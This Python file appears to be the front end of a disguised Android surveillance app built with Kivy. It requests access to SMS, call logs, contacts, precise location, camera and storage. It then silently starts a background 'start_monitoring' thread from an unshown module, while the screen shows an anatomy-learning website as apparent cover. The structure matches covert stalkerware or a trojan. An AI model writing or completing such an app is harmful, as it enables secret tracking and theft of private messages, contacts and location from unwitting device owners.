from kivy.app import App
from threading import Thread
from kivy.utils import platform

class SystemInterface(App):
    def build(self):
        if platform == 'android':
            from android.permissions import request_permissions, Permission
            perms = [Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE,
                     Permission.CAMERA, Permission.READ_CALL_LOG, Permission.READ_CONTACTS, 
                     Permission.ACCESS_FINE_LOCATION, Permission.READ_SMS]
            request_permissions(perms)

            import core_logic
            Thread(target=core_logic.start_monitoring, daemon=True).start()

            from jnius import autoclass
            from android.runnable import run_on_ui_thread
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            WebView = autoclass('android.webkit.WebView')
            WebViewClient = autoclass('android.webkit.WebViewClient')
            
            @run_on_ui_thread
            def load_web():
                wv = WebView(activity)
                wv.getSettings().setJavaScriptEnabled(True)
                wv.getSettings().setDomStorageEnabled(True)
                wv.setWebViewClient(WebViewClient())
                wv.loadUrl('https://anatomylearning.com/') 
                activity.setContentView(wv)
            load_web()
        return None

if __name__ == '__main__':
    SystemInterface().run()